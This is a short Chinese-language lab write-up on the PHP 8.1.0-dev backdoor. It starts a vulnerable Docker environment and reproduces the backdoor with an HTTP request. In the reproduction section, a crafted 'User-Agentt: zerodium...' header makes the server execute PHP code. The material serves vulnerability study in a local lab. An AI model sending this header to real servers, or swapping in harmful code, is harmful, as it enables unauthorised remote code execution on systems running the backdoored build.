# PHP 8.1.0-dev 开发版本后门事件

## 漏洞环境

执行如下命令启动一个存在后门的PHP 8.1服务器：

```plain
docker compose up -d
```

环境启动后，服务运行在http://your-ip:8080。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896244858-10dc7102-0b4a-4db9-bf11-ec2a4dd8a6ca.png)

## 漏洞复现

发送如下数据包，可见代码var_dump(233*233);成功执行：

```plain
GET / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
User-Agentt: zerodiumvar_dump(233*233);
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896244910-618c2072-76b1-4e7d-91de-d21640b5b3c8.png)